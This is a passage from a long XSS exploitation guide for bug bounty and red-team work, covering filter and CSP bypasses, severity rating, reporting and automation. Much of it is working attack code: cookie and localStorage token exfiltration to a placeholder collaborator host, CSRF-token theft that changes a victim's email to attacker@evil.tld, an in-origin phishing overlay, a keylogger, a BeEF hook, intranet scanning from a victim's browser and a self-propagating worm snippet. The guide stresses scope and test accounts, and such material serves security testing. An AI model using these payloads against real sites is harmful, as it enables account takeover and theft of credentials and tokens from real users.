     that reflects) → no enforcement → DOM XSS works; report the misconfig + injection.
  4) NON-TT sinks: navigation (`location = 'javascript:...'`), and gadget chains the policy doesn't cover → still fire.
  5) Sink the policy SANITIZES weakly (mXSS, §14) → a mutation that re-introduces script AFTER createHTML → bypass.
```
> **If this → then that:** your DOM-XSS payload throws a *TrustedHTML* error → Trusted Types is **enforced**, not absent. Don't give up — (a) check for a **`default` policy** or a reusable named policy that under-sanitizes (the #1 real-world TT bypass), (b) confirm it's actually **enforced** (not report-only, and present on the *reflecting* response), (c) pivot to **non-TT sinks** (`location=javascript:`) or **mXSS through the policy**. A reachable pass-through `createHTML` policy = TT provides **zero** protection → report the DOM XSS as if TT weren't there.

---

# 20. Encoder / Sanitizer Deep-Dive Bypass

When output is encoded, figure out **which encoder, in which context**, and whether it's **context-correct**. Encoders are context-specific; the bug is usually a **context mismatch**.

```
□ HTML-encoded (< > " ' → entities) but you're in a JS string?  → HTML encoding doesn't stop JS-string breakout if " is the JS delimiter and the encoder missed it, OR if the value is HTML-decoded before JS runs (attribute event handlers, §7.3).
□ HTML-encoded but landing inside ng-app (AngularJS)?           → {{ }} CSTI bypasses HTML encoding (§15.3).
□ Encoded on render but stored RAW and reused elsewhere?        → second-order (§12.3).
□ Only < and > encoded, but " and ' literal in an attribute?    → attribute breakout still works (§7).
□ Encodes on FIRST decode but sink decodes AGAIN?               → double-encode to survive the first pass.
□ Sanitizer strips <script> but allows <svg>/<math>/event attrs? → enumerate the allow/deny list precisely (§6, §14).
□ JS-escapes " and \ but not </script>?                          → close the script element from a JS string context (§8.4).
```
**Method:** send a probe with *every* metacharacter (§5.2), tabulate exactly what survives in *that* context, and build the minimal payload from the survivors. The bypass is whatever the encoder forgot for the context you're in.

---

# 21. Length-Limited & Character-Restricted XSS

When the field truncates or bans characters.

## 21.1 Short payloads
```html
<svg onload=alert()>          <!-- 19 chars -->
<svg/onload=alert()>          <!-- slash saves a space -->
<a href=//x onclick=alert()>  <!-- needs a click but tiny -->
```

## 21.2 Load the rest remotely (when you have ~30+ chars)
```html
<script src=//x.tld></script>       <!-- buy a 1-char-TLD-ish short domain; host the real payload there -->
<svg onload=import('//x.tld')>      <!-- dynamic import -->
```

## 21.3 Split across two inputs / use a second source
```javascript
// Field A (short, executes):   <script>eval(name)</script>
// Provide the long payload via window.name from your launching page:
//   win.name = "fetch('//YOUR/'+document.cookie)"; win.location='https://target/?x=<script>eval(name)</script>'
```

## 21.4 Reuse existing page values
When characters are banned, build payloads from `location`, `document.cookie`, `[]`, `+`, `!` (JSFuck-style) — verbose but character-restricted-friendly. Reserve for genuinely tight filters.

---

# 22. Charset / Encoding Tricks

- **Missing charset → UTF-7 (legacy):** if a page lacks a `charset` and the browser can be coerced to UTF-7, `+ADw-script+AD4-` becomes `<script>`. Largely dead in modern browsers but appears on old/embedded targets.
- **Overlong / alternate UTF-8** and **charset confusion** between the WAF and the app can slip metacharacters past the filter.
- **`%00` / null bytes** and **control characters** sometimes terminate a filter's match early while the browser ignores them.
- **`Content-Type` sniffing:** a response without a correct `Content-Type`/`X-Content-Type-Options: nosniff` may be sniffed as HTML and execute injected markup (relevant for JSON/text endpoints that reflect input — a classic "reflected XSS in a JSON endpoint" when `nosniff` is missing and `Content-Type` isn't `application/json`).

---

# PART IV — IMPACT (where the money is)

> This is the section to live in. Parts I–III get you `alert(document.domain)`. Part IV turns that into a payout. **Every escalation here uses YOUR OWN test accounts and YOUR OWN collaborator** — never exfil real users' data (§38, §40).

# 23. The Escalation Mindset

A triager's first question on any XSS is **"so what?"** Answer it with one of these, in descending value:

```
1. Account takeover of ANOTHER user (or admin), 0-click           → Critical
2. Theft of session/auth token usable to impersonate a victim     → High–Critical
3. Forced state change in the victim's session (email/pw change)  → High–Critical (= ATO)
4. Cross-user / admin data disclosure                              → High
5. Credential harvesting / convincing in-origin phishing          → Medium–High
6. Internal-network recon / SSRF-ish pivot from victim browser     → Medium–High (red team)
7. Defacement / content manipulation only                          → Low–Medium
8. alert(1) on a page with no auth/sensitive context               → Low/Info
```
Your job in Phase 5 is to climb this ladder as high as the app allows and **demonstrate** it with a clean PoC. Pick the path from what you learned in §1.4: **cookie session → §24/§26**, **token in localStorage → §25**, **admin context → §32**.

---

# 24. Session & Cookie Theft

The classic. Viable **only if the session cookie lacks `HttpOnly`** (JS can read it). Check `document.cookie` in console.

```javascript
// Simplest proof (exfil to YOUR collaborator):
new Image().src='//YOUR.oast.fun/c?'+encodeURIComponent(document.cookie);
fetch('//YOUR.oast.fun/c',{method:'POST',body:document.cookie,mode:'no-cors'});
```
- **HttpOnly set?** You **cannot** read the cookie with JS → pivot to **token theft (§25)** or **CSRF-token-theft → forced action (§26)**, which don't need to read the cookie. State this in the report — it shows you understood the control.
- **Demonstrate impact:** replay the stolen cookie in your attacker browser to load the victim's authenticated page; screenshot the victim's account. That's the proof, not the `document.cookie` string.

Full script: `poc/cookie_steal.js`. See §38 for doing this **safely** (exfil only your own test account's cookie).

---

# 25. Token / localStorage / sessionStorage Theft

Modern SPAs often keep **JWTs / OAuth access tokens / refresh tokens** in `localStorage`/`sessionStorage` (always JS-readable — `HttpOnly` doesn't apply). This is frequently the *real* crown jewel.

```javascript
// Dump everything the SPA stores client-side:
fetch('//YOUR.oast.fun/t',{method:'POST',mode:'no-cors',
  body: JSON.stringify({ls:{...localStorage}, ss:{...sessionStorage}, cookie:document.cookie})});
```
- **Impact:** a stolen Bearer/refresh token lets you call the API **as the victim** from your own machine, often long-lived. Demonstrate by making one authenticated API call (e.g. `GET /api/me`) with the stolen token and showing the victim's data.
- **Refresh tokens** are worse (re-mint access tokens) → near-permanent ATO. Call that out explicitly; it raises severity.

Full script: `poc/token_exfil.js`.

---

# 26. CSRF-Token Theft → Forced Actions → 0-click ATO

When cookies are `HttpOnly` (can't steal them) and there's no readable token, you **don't need the cookie** — you're *already executing in the victim's origin*. Read the page's anti-CSRF token with JS and perform a **privileged state-changing request** in their session.

```javascript
// 1) Read the CSRF token from the DOM (it's in the page you control)
const t = document.querySelector('input[name=csrf_token]').value;     // or from a meta tag / JS var

// 2) Perform a sensitive action AS THE VICTIM (same-origin, cookies auto-attached)
fetch('/account/email', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'csrf_token='+t+'&email=attacker@evil.tld'   // change recovery email → then reset password
});
```
- **This is how XSS becomes ATO even with perfect cookie hardening.** Change the email/phone → trigger password reset → own the account. Or add an attacker SSH key / API token / OAuth grant.
- Because the script runs **in the victim's session automatically** when they view your stored payload, this is **0-click** for stored XSS.

Full chain script: `poc/account_takeover.js` (parameterized for "change email" / "add API key" patterns).

---

# 27. Account Takeover Chains

String the primitives into a full takeover. Pick whichever the app exposes:

```
A) Email/recovery change → password reset
   XSS → read CSRF token → POST new recovery email → request reset → reset lands in attacker inbox.

B) Password change directly
   Many apps let you change password WITHOUT the old one if you're "authenticated".
   XSS → POST /account/password {new:...} with the victim's session → log in as them.

C) OAuth / API token mint
   XSS → POST /oauth/authorize or /settings/tokens → mint a long-lived token/grant to attacker client.

D) Add second factor / passkey / SSH key
   XSS → register an attacker-controlled WebAuthn key / API key → persistent access surviving password reset.

E) Privilege change (if the user can self-modify role, or it's an admin)
   XSS in an admin's session → POST role=admin to your attacker account (§32).
```
**Demonstrate end-to-end on your own two test accounts:** attacker plants payload → victim account (your 2nd test user) renders it → script changes victim's email to an inbox you control → you complete the reset → you log in as victim. Screenshot each step. That's an unambiguous Critical.

---

# 28. Credential Harvesting & In-Origin Phishing

When you can't directly steal a session/token (e.g. strict CSP blocks exfil but allows DOM writes), use the execution to **phish within the real origin** — far more convincing than a fake domain because the URL bar is legitimate.

```javascript
// Overlay a fake "Session expired, re-enter password" form ON the real site, POST creds to you:
document.body.innerHTML = `<div style="position:fixed;inset:0;background:#fff;z-index:9999">
  <form onsubmit="navigator.sendBeacon('//YOUR.oast.fun/p',new FormData(this));return false">
  Session expired. Please sign in again.<br>
  <input name=u placeholder=email><input name=p type=password placeholder=password>
  <button>Sign in</button></form></div>`;
```
- Impact = credential theft with the **authentic origin** in the address bar. Pair with the legitimate look-and-feel for the report (but **only collect your own test creds**).
- For red-team, this is a strong pretext; for bounty, it raises a reflected XSS from "Low" toward "Medium–High" by demonstrating realistic credential capture.

Full script: `poc/phish_overlay.js`.

---

# 29. Keylogging & Form Capture

Demonstrates ongoing data capture from the victim's session — useful when the sensitive value is typed (passwords, card numbers, OTPs, messages).

```javascript
// Capture keystrokes (or just the sensitive fields) and beacon them out:
document.addEventListener('keydown', e => navigator.sendBeacon('//YOUR.oast.fun/k', e.key));
// Better signal: snapshot card/password/OTP fields on input
['input','change'].forEach(ev=>document.addEventListener(ev,e=>{
  if(/pass|card|cvv|otp|ssn/i.test(e.target.name||''))
    navigator.sendBeacon('//YOUR.oast.fun/f', e.target.name+'='+e.target.value);
},true));
```
Full script: `poc/keylogger.js`. Strong on payment/login pages; keep capture scoped to your own test input for the PoC.

---

# 30. Browser Hooking with BeEF (red team)

For red-team engagements, **BeEF** turns one XSS into an interactive hold on the victim browser: live command modules (keylogger, screenshot, network fingerprint, social-engineering popups, persistence via iframe).

```bash
# Start BeEF
cd beef && ./beef            # crehttp://127.0.0.1:3000/ui/panel  (default beef:beef — CHANGE IT)

# Hook payload (loads from your BeEF host):
<script src="//YOUR-BEEF-HOST:3000/hook.js"></script>
```
- **Use:** persistent control, intranet recon (§31), pivoting, realistic phishing modules.
- **OPSEC (red team):** host the hook on infra you control with TLS, rotate, and scope strictly to the engagement (§40). For bug bounty, BeEF is usually overkill and noisy — a single clean PoC beats a hook. Use BeEF for *red-team* deliverables, not bounty reports.

---

# 31. SSRF-via-XSS, Internal Recon & Pivot

XSS executes in the **victim's browser**, which may sit **inside a corporate/intranet network**. That browser becomes your proxy into places your own machine can't reach.

```javascript
// Port/host scan from the victim browser (timing/onload/onerror oracle)
['http://10.0.0.1','http://internal-jira','http://192.168.1.1:8080'].forEach(u=>{
  const t=performance.now(), i=new Image();
  i.onload=i.onerror=()=>navigator.sendBeacon('//YOUR.oast.fun/scan',u+' '+(performance.now()-t));
  i.src=u+'/favicon.ico?'+Math.random();
});
// Fetch internal pages (if CORS/opaque allows) and exfil titles/snippets:
fetch('http://internal-admin/',{mode:'no-cors'}); // timing + existence oracle even when opaque
```
- **Impact (red team / some bounty):** discover and reach internal admin panels, cloud-metadata (`169.254.169.254` — usually blocked from browsers but worth probing), routers, printers; pivot to internal app exploitation through the hooked browser.
- For bounty, this is strongest when it demonstrably reaches an **internal-only** asset of the target; frame it as the victim browser being used as an SSRF pivot.

Full script: `poc/internal_scan.js`.

---

# 32. Admin-Panel Stored XSS & Privilege Escalation

The highest single-bug payout: a **stored** payload that fires **in an admin/staff member's authenticated session** (often reached via **blind XSS**, §13).

```
Why it's Critical:
- Admins have broad permissions → your script runs WITH those permissions.
- 0-click: the admin just opens the page where your input renders (user list, ticket, report queue).
- One payload can act on ALL users (read PII, change roles, create admin accounts) → mass impact.

Escalation once you're in an admin DOM:
1. Read admin-only data on the page (user PII, internal notes, tokens) and beacon it.
2. Use the admin's CSRF token (§26) to perform admin actions:
   - Promote your attacker account to admin:   POST /admin/users/<you>/role {role:'admin'}
   - Create a new admin user.
   - Disable logging / exfil secrets / read other tenants (multi-tenant = catastrophic).
3. Establish persistence (add an API key / second admin) if red-team scope allows (§40).
```
**Demonstrate** with two accounts: a low-priv account plants the payload (e.g. in a support ticket), and your *own* admin/staff test account (or the program's, per their PoC rules) renders it; show your script reading an admin-only element or promoting a test account. This is the report that pays the most.

---

# 33. Wormable / Self-Propagating XSS

When a stored XSS lives in content that other users both **view and can re-share**, the payload can **re-inject itself** into each viewer's profile/content → exponential spread (the Samy/MySpace pattern).

```javascript
// Conceptual self-propagation (DEMONSTRATE SCOPE-SAFELY — do NOT actually spread on a live site):
// On firing in victim's session, post the SAME payload to the victim's own profile/status,
// so everyone who views THEM also gets infected.
fetch('/profile/update',{method:'POST',credentials:'include',
  body:new URLSearchParams({bio: PAYLOAD, csrf: getToken()})});
```
> **Worm caution (critical for bounty & ethics):** **never actually release a self-propagating payload on a production multi-user app.** It harms real users, violates scope, and can be illegal. For the report, **describe** the wormability and prove the single-hop self-post on your own two accounts only. The *wormability* argument (not an actual worm) is what justifies the Critical rating.

---

# PART V — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)

> Parts I–IV teach you to find and escalate. Part V teaches you to get **paid** and not get your report closed as Informational/Duplicate/N-A. The #1 reason a technically-real XSS underpays is reporting a **condition** (`alert(1)` fired) instead of an **impact** ("here is account B's session, taken over from a stored payload account A planted").

# 34. The Validity-First Mindset for XSS

## 34.1 The four questions a triager asks (answer them *in your report*)
1. **What can an attacker actually do?** Name the concrete outcome: take over an account, read another user's/admin's data, perform actions as them, steal a token. `alert(1)` is not an outcome — it's the proof the door is open.
2. **What does the victim have to do?** **0-click (stored, auto-fires) > 1-click (open my link while logged in) > needs the victim to paste something (self-XSS = invalid).** The more interaction required, the lower the severity.
3. **In whose context does it run, and is that context sensitive/authenticated?** XSS on a logged-out static marketing page ≪ XSS in an authenticated app ≪ XSS in an admin panel.
4. **Is it reproducible & in scope?** Production host, in-scope asset, copy-pasteable URL/steps, and a PoC that doesn't harm real users.

## 34.2 The "execution vs impact" rule (most important)
Proving execution is necessary but **not sufficient**. Map your finding honestly:

| You have | Standalone verdict | Becomes valuable when… |
|---|---|---|
| `alert(1)` reflected, logged-out page, behind a click | Low/Info | …it runs in an **authenticated** context AND you chain it to token/CSRF-token theft → ATO (§26/§27). |
| Reflected XSS, authenticated, cookie is HttpOnly | Medium | …you steal the **CSRF token** and force an email/password change → **ATO** (§26). |
| Stored XSS only you can see (your own profile, only you render) | Low (self-ish) | …another user or **admin** renders it 0-click (§12.3, §32). |
| Token readable in localStorage | High | …you call the API as the victim with it and show their data (§25). |
| DOM XSS via `#hash`, no sensitive action | Low–Medium | …the sink is in an authenticated flow and you reach ATO/data (§11). |
| XSS injection blocked by a strict CSP | Info–Low | …the CSP is **report-only/bypassable**, or another response lacks it (§19). |

## 34.3 Production-scope discipline
- Confirm the bug on the **production** host/build with the **production** CSP/WAF in place — a payload that only works with security headers disabled, or on a staging box, may be out of scope or downgraded.
- Re-test after any "we deployed a fix" — partial fixes (blocking one tag, one event) are common and the bypass is a fresh, valid finding.

## 34.4 One-CWE, one-root-cause mapping
Collapse every symptom of one flaw into a single finding. A scanner firing 12 "reflected XSS" rows that are all the *same* unencoded `search` param in different pages is **one** finding (CWE-79). Two payloads (cookie-theft + CSRF-token-theft) proving the *same* injection are **two demonstrations of one** bug, not two bugs. Report the chain, not the fragments.

---

# 35. False Positives — STOP reporting these (auto-reject list)

These destroy your credibility with a program. Each has a *narrow* condition under which it becomes real — know the difference.

| # | Commonly mis-reported as XSS | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **Self-XSS** (paste into your own console/field, only you affected) | No cross-user delivery; the victim attacks themselves. | If you find a **delivery** vector (a URL, a stored value others render, a forced request) → report *that*. |
| 2 | **`alert(1)` with no impact / logged-out static page** | Execution without a sensitive context isn't impactful. | Authenticated context + an escalation chain (§24–§27). |
| 3 | **Reflected value that's HTML-encoded** (you see `&lt;svg&gt;`) | It's *not executing* — it's being displayed as text. Reflection ≠ XSS. | Only if a context/second-order/CSTI path makes it execute (§15.3, §12.3). |
| 4 | **Injection that only fires behind a strict, unbypassable CSP** | The CSP blocks execution → no real-world impact. | If CSP is report-only/bypassable or absent elsewhere (§19). |
| 5 | **"XSS" in `Content-Type: application/json` with `nosniff`** | Browser won't render JSON as HTML → no execution. | If `nosniff` is missing AND `Content-Type` is sniffable to HTML (§22). |
| 6 | **XSS requiring an unrealistic header you can't make the victim send** | If only *you* can set the `Referer`/`User-Agent` on your own request, there's no victim. | If it's **stored/blind** and lands in a staff tool that renders that header (§13). |
| 7 | **"XSS" that needs the victim to disable security / use EOL browser** | Not a realistic attack on a normal user. | If it works on a current, default browser. |
| 8 | **Open redirect reported as XSS** | A redirect to `https://evil` is not script execution. | If `next=javascript:`/`data:` actually executes (DOM XSS, §9/§11) — then it's XSS. |
| 9 | **Markdown/`javascript:` link that modern browsers neuter** | Some renderers/browsers strip it; "it's in the source" ≠ it runs. | Prove execution on a current browser in the app origin. |
| 10 | **Stored value that's encoded everywhere it renders** | If every consumer encodes it, it never executes. | Find the **one** consumer that renders it raw (second-order/admin view, §12.3). |
| 11 | **Reflected `alert` on `Content-Disposition: attachment` / sandboxed CDN** | Runs in a sandbox / downloads, not the app origin. | If served inline from the **app origin** (§16.1). |

> Rule of thumb: if you can't write the sentence *"An attacker can make victim X, while doing nothing unusual, suffer concrete harm Y"*, you don't yet have a reportable XSS — you have a curiosity. Keep escalating or drop it.

---

# 36. Severity Calibration — how triagers really rate XSS

Set a severity you can **defend** with a CVSS vector. "Alone" = the finding by itself; "Chained" = realistic uplift.

| XSS scenario | Typical alone | Realistic chained | What moves it |
|---|---|---|---|
| **Stored, fires 0-click in an ADMIN/staff session** | **Critical** | Critical | Admin actions / mass user impact / multi-tenant; possibly wormable (§32, §33). |
| **Stored, fires 0-click in another USER's session** | **High** | Critical (ATO/worm) | Up with token/CSRF-token-theft → ATO, or self-propagation. |
| **Reflected, authenticated, chains to ATO** | **High** | Critical | Demonstrate full email/password takeover (§27). |
| **Reflected, authenticated, no ATO chain (yet)** | **Medium** | High | Cookie/token/CSRF-token theft pushes it up. |
| **DOM XSS in an authenticated/sensitive flow** | **High** | Critical | Same chains; bonus that it bypasses WAF/CSP. |
| **Blind XSS landing in an internal admin tool** | **High–Critical** | Critical | Severity = what the admin context lets you do (§32). |
| **Reflected XSS, unauthenticated/marketing page** | **Low–Medium** | Medium | Up only if it reaches an auth/sensitive flow or session. |
| **mXSS / sanitizer bypass (stored, rendered to others)** | **High** | Critical | Defeats the primary defense; lands cross-user (§14). |
| **Self-XSS** | **Info/N-A** | — | Only via a delivery chain (§35.1). |
| **XSS blocked by strict, unbypassable CSP** | **Info–Low** | — | Up if CSP is report-only/bypassable (§19). |
| **CSS-injection token exfil (no JS)** | **Medium** | High | If it leaks CSRF/session/PII (§10, §26). |
| **`javascript:`/`data:` link XSS (1-click)** | **Medium** | High | Up with the ATO chain. |

**CVSS pointers (v3.1):**
- Reflected, 1-click, ATO: roughly `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` → High (often ~8.x). `S:C` (scope changed) is defensible because XSS in one origin affects the user's session/credentials.
- Stored, 0-click, admin: `UI:N`, `PR:N`, `S:C`, `C:H/I:H` → Critical (~9.x).
- Anchor to **CWE-79** (or **CWE-80** specific; **CWE-116** for the encoding root cause). If you can't tell an attacker story, your severity is too high.

---

# 37. Impact-Escalation Playbooks — "you found X, now do Y"

Each: **trigger → escalation steps → evidence to capture → resulting severity.** This is the section to live in.

### 37.1 You found: *reflected `alert(1)` in an authenticated app, cookie is HttpOnly*
- **Escalate:** you can't read the cookie, so use the session directly. Read the page's **CSRF token** (§26) and POST a sensitive change (email/password) as the victim → ATO. Or read & exfil sensitive page data.
- **Evidence:** the forced request + response in the victim's session changing the victim's email to your inbox, then a completed password reset.
- **Severity:** Medium alone → **High–Critical** with the ATO chain.

### 37.2 You found: *reflected `alert(1)`, cookie NOT HttpOnly*
- **Escalate:** steal the cookie (§24), replay it in a clean browser, screenshot the victim's authenticated account.
- **Evidence:** the exfil callback + a screenshot of the victim's account loaded with the stolen cookie.
- **Severity:** **High** (1-click ATO via session theft).

### 37.3 You found: *token in localStorage (SPA)*
- **Escalate:** exfil it (§25), call `GET /api/me` (and a sensitive write) as the victim from your machine. Note refresh-token longevity.
- **Evidence:** an authenticated API response containing the victim's data, made with the stolen token.
- **Severity:** **High–Critical** (esp. with a refresh token = persistent ATO).

### 37.4 You found: *stored XSS only you currently render*
- **Escalate:** find a **consumer that renders it to someone else** — admin moderation queue, another user's feed, an HTML email, a CSV/PDF export, a "recent users" dashboard (§12.3). Use a blind beacon (§13) to learn where it fires.
- **Evidence:** the beacon firing from an internal/admin URL, or a second test user's session executing it 0-click.
- **Severity:** **High** (user) → **Critical** (admin).

### 37.5 You found: *blind XSS callback*
- **Escalate:** read the callback's page URL + DOM to identify the tool. If admin, read admin-only data and (with their CSRF token) perform an admin action like promoting a test account (§32).
- **Evidence:** screenshot/DOM from XSS Hunter showing the internal admin origin + an admin-only element your script read.
- **Severity:** **High–Critical** by the admin context's power.

### 37.6 You found: *DOM XSS via `#hash`/`postMessage`*
- **Escalate:** confirm it's 0-click (postMessage from an attacker frame) or 1-click (hash link). Then run the §24–§27 chains. Highlight that it **bypasses the server WAF** (fragment never sent) and possibly CSP (`location=javascript:`).
- **Evidence:** the exploit URL/attacker page + the impact chain.
- **Severity:** **High–Critical**; emphasize the WAF/CSP bypass.

### 37.7 You found: *injection but a CSP blocks `script-src`*
- **Escalate:** evaluate the CSP (§19). If `unsafe-inline`/`unsafe-eval`/wildcard/JSONP-CDN/`script-gadget`/report-only → bypass and execute. If genuinely strict → pivot to dangling-markup or CSS token exfil (§10) and report the **disclosure**.
- **Evidence:** execution via the CSP bypass, or a leaked CSRF/session token via no-JS exfil.
- **Severity:** restores High–Critical if you bypass; Medium (token disclosure) if you only exfil.

### 37.8 You found: *XSS in input that only staff see (User-Agent/Referer/feedback)*
- **Escalate:** treat as **blind** (§13). Plant a beacon; wait for the staff tool to render it.
- **Evidence:** callback from the internal tool.
- **Severity:** **High–Critical** (lands in privileged context).

### 37.9 You found: *self-XSS only*
- **Escalate:** it's invalid alone (§35.1). Hunt a **delivery** vector — a CSRF that submits the payload into the victim's own field, a shareable URL, a stored sink. If none exists, **drop it**.
- **Evidence:** the delivery mechanism turning self-XSS into cross-user XSS.
- **Severity:** Info alone → as high as the delivered chain (often High).

---

# 38. Building a Professional, Safe PoC

A good PoC is **unambiguous, minimal, reproducible, and harmless to real users**. This is what gets fast triage and full payout.

## 38.1 Prove the right thing
- Use `alert(document.domain)` (shows *which origin*), or — better for a written report — a **collaborator callback that includes `document.domain`** so execution is provable server-side:
  ```javascript
  new Image().src='//YOUR.oast.fun/poc?o='+encodeURIComponent(document.domain);
  ```
- Avoid `alert(1)` alone in the report — it doesn't prove origin and looks low-effort.

## 38.2 Make it minimal & context-correct
- Submit the **simplest** payload for the actual context (§6–§10), not a kitchen-sink polyglot. It proves you understand the bug and removes "is this a false positive?" doubt.

## 38.3 Make it safe (critical for legality & scope)
```
DO:
  □ Exfil ONLY your own test account's data to YOUR OWN collaborator.
  □ Use two of YOUR OWN accounts for cross-user/ATO demos.
  □ For "admin XSS", demonstrate on a test admin account, or with the program's permission/their test users.
  □ Keep payloads non-destructive (no defacement, no deleting data, no mass-firing).
DON'T:
  □ Exfil real users' cookies/tokens/PII.
  □ Release a worm / auto-spreading payload on a live multi-user app (§33).
  □ Run mass automated XSS that floods other users' views.
  □ Leave persistent payloads in shared content after testing — clean them up.
```

## 38.4 Capture the evidence triagers want
- The **exact request/URL** (copy-pasteable) that triggers it.
- A **screenshot or video** of execution (alert with `document.domain`, or the impact: victim account taken over).
- For blind/stored: the **collaborator/XSS-Hunter log** (URL it fired on, DOM, screenshot) proving *where* it landed.
- For impact chains: side-by-side showing **the action performed in the victim's session**.

## 38.5 Provide remediation
Context-correct output encoding + a strict CSP + framework-safe sinks (avoid `dangerouslySetInnerHTML`/`v-html`/`innerHTML`; use textContent; sanitize with an up-to-date DOMPurify). Naming the fix speeds resolution and bonuses.

---

# 39. Reporting, CWE/CVSS & De-duplication

Use the full skeleton in `XSS_REPORT_TEMPLATE.md`. Minimum a report must contain:

```
1. Title           "Stored XSS in support-ticket subject → 0-click admin account takeover"
                   (name the IMPACT, not just "XSS in X")
2. Severity        CVSS 3.1 vector + score + one CWE (CWE-79 / CWE-80 / CWE-116)
3. Affected asset  Exact prod URL/endpoint/parameter + the context (§3.3)
4. Summary         One paragraph: where, what context, what impact, click-count.
5. Steps to repro  Numbered, copy-pasteable: the URL/request, the payload, what fires.
6. PoC             The minimal payload + collaborator callback; screenshot/video.
7. Impact          The escalation you demonstrated (ATO / data / admin) — the "so what".
8. Remediation     Context-correct encoding + CSP + safe sink.
```

**De-dup before submitting:** same param, many pages = one finding. Same root cause, several payloads = one finding with multiple demonstrations. Don't split a chain into pieces; report the chain with the highest-impact framing.

---

# 40. Red-Team Notes

When the engagement is red-team (not bounty), the goals shift from "report a bug" to "demonstrate business impact under realistic conditions, quietly."

```
□ OPSEC
  - Host hooks/exfil on dedicated, TLS-enabled, attribution-clean infra; rotate domains.
  - Avoid noisy beacons/alerts; prefer quiet sendBeacon / DNS exfil; throttle.
  - Scope strictly to authorized assets and users; log everything you do for the report.
□ Delivery / staging
  - Stage long payloads remotely (short stub in the field, real logic loaded from your host, §21).
  - Use blind XSS into internal tools to reach the privileged plane (§13, §32).
□ Persistence (only if scoped)
  - Stored payload in long-lived content; an added attacker API key / second admin (§27D, §32).
  - Service-worker registration for re-execution (where same-origin & scope allow).
□ Pivot
  - Hooked browser as an SSRF proxy into the intranet (§31); BeEF for interactive control (§30).
□ Cleanup
  - Remove planted payloads, added keys/users, and service workers at the end; document removal.
```
For bug bounty, most of this is **out of scope and counter-productive** — one clean, safe PoC beats a hook. Keep the two mindsets separate.

---

# 41. Automation & Scaling

Automation **widens coverage**; it doesn't replace context analysis. Use it to find candidates fast, then verify and escalate manually.

```bash
# 1) Collect surface
echo target.com | waybackurls | gf xss | qsreplace '"><svg onload=confirm(1)>' > probe.txt
katana -u https://target.com -jc | gf xss | tee -a probe.txt

# 2) Find reflective params keeping dangerous chars
cat probe.txt | Gxss -c 50 | tee reflected.txt

# 3) Verify reflected XSS with context-aware engines
dalfox file reflected.txt --waf-evasion --skip-bav -o dalfox.txt
python xsstrike.py -u "https://target.com/search?q=FUZZ" --crawl

# 4) Blind XSS at scale: inject your XSS-Hunter payload into every field/header
#    (Burp + a header/body insertion point list; let callbacks come in)

# 5) DOM XSS: Burp DOM Invader while you browse; review JS bundles for sinks (§11,§15)
```
- **Burp Intruder/Bambdas/extensions** (Reflected Parameters, Hackvertor for encoding, DOM Invader) are the workhorses for manual-grade verification.
- **Quality gate:** never submit raw scanner output. Reproduce by hand, confirm the **context** and **execution**, and build the **impact** (§37). A confirmed escalated bug beats 100 unverified "reflections".

---

# 42. Case Studies & Real-World Chains

**A) Reflected `search` param → CSRF-token theft → 1-click ATO (cookie HttpOnly).**
A `?q=` param reflected unencoded in the HTML body of an *authenticated* dashboard. Cookies were `HttpOnly` (no cookie theft). Escalation: payload read the page's `csrf_token` and POSTed a recovery-email change to an attacker inbox (§26), then triggered password reset. Lesson: HttpOnly does **not** save you from XSS-driven ATO — the script acts *in* the session. Reported as **High** with the full ATO chain, not as "reflected alert".

**B) Stored XSS in a support-ticket subject → 0-click super-admin compromise (blind).**
The subject field was safely encoded on the user's own ticket view but rendered **raw** in the agent/admin CRM. A blind beacon (§13) fired from `admin.internal.target/tickets/…`, revealing an admin DOM. The payload read admin-only PII and (with the admin's CSRF token) promoted a test account to admin (§32). Lesson: **second-order + blind** is where the crown jewels are; the submit-page view lied about safety. **Critical.**

**C) DOM XSS via `#hash` → token theft, full WAF + partial CSP bypass.**
A SPA read `location.hash` into `innerHTML` client-side. The server WAF never saw it (fragment isn't sent), and the CSP allowed an inline gadget. Stolen `localStorage` JWT enabled API calls as the victim (§25). Lesson: hunt DOM sinks even on "well-protected" targets — server defenses don't apply to the fragment.

**D) AngularJS CSTI behind HTML encoding.**
`< >` were HTML-encoded everywhere, so generic payloads failed and the param looked "safe". But the reflection sat inside an `ng-app` region, so `{{constructor.constructor('alert(document.domain)')()}}` — needing **no `< >`** — executed despite encoding (§15.3). Lesson: when `< >` are encoded but `{}` survive **and** the app uses AngularJS, you still have XSS.

> **Common thread:** in every case the payout came from the **escalation and the context**, not the injection. The injection was the *door*; the report was about what was **behind** it.

---

# Appendix A — XSS Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────┐
│                     XSS HUNTING WORKFLOW                        │
├────────────────────────────────────────────────────────────────┤
│ 0. SCOPE + LAB                                                 │
│    └→ confirm scope · Burp + 2 browsers · stand up OOB listener│
│ 1. RECON / SURFACE MAP                                         │
│    ├→ waybackurls/gau/katana · Arjun hidden params            │
│    ├→ collect: query · path · POST · JSON · headers · cookies  │
│    │   · uploads · postMessage · websockets                    │
│    └→ fingerprint: framework · CSP · WAF · cookie flags        │
│ 2. REFLECTION + CONTEXT  ★ do not skip                         │
│    ├→ unique marker into EVERY input → where does it land?     │
│    ├→ char probe '"<>(){};=`  → what survives?                 │
│    └→ name the CONTEXT (HTML/attr/JS/URL/CSS/DOM)              │
│ 3. EXECUTE (by context)                                        │
│    ├→ HTML <svg onload> · attr "><svg> · JS ";alert()//        │
│    ├→ URL javascript: · DOM Invader · stored · blind · mXSS    │
│    └→ CONFIRM exec: alert(document.domain) / collaborator hit  │
│ 4. BYPASS DEFENSES                                             │
│    └→ WAF mutate · CSP evaluate+bypass · encoder · length      │
│ 5. IMPACT  ⭐ (the money)                                       │
│    ├→ cookie theft (no HttpOnly)  →  §24                       │
│    ├→ token/localStorage theft    →  §25                       │
│    ├→ CSRF-token → forced action  →  §26  (HttpOnly-proof ATO) │
│    ├→ full ATO chain (email/pw)   →  §27                       │
│    ├→ phish/keylog/BeEF/internal  →  §28–§31                   │
│    └→ admin stored / worm         →  §32–§33                   │
│ 6. VALIDATE → SEVERITY → REPORT                                │
│    ├→ false-positive filter (§35) · CVSS+CWE-79 (§36)          │
│    ├→ SAFE minimal PoC (§38) · evidence · remediation          │
│    └→ de-dup → submit with IMPACT in the title                 │
└────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Context Decision Tree

```
